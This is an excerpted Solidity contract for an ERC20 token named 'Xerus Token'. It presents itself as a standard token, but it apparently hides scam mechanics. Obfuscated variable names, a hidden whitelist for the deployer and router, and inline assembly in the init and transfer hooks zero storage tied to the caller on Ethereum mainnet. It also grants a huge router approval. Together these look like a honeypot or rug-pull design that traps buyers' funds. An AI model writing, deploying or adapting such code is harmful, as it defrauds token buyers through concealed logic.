...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addXerus;
    uint256 private risingTide = block.number*2;

    mapping (address => bool) private _firstWater; 
    mapping (address => bool) private _secondWine;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private peaceSign;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private whiteFlag;
    address public pair;
    ...
    bool private trading; uint256 private pinkRed = 1; bool private greenBlack;
    uint256 private _decimals; uint256 private woodHard;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addXerus.push(_router); addXerus.push(msgSender_); addXerus.push(pair);
        for (uint256 q=0; q < 3;) {_firstWater[addXerus[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x07dac5df272080702fe74e9cd92ee9c9eb25d890aecf6389b1dbcbaef9c41b2f
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x7a32577d2891fce06f99bd61143c2b3568bb82fe1241e905366beb6c422c20b7,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; risingTide = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addXerus[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployXerus(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addXerus[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployXerus(creator, initialSupply);
    }
}

contract Xerus is ERC20Token {
    constructor() ERC20Token("Xerus Token", "XERUS", msg.sender, 12500000 * 10 ** 18) {
    }
}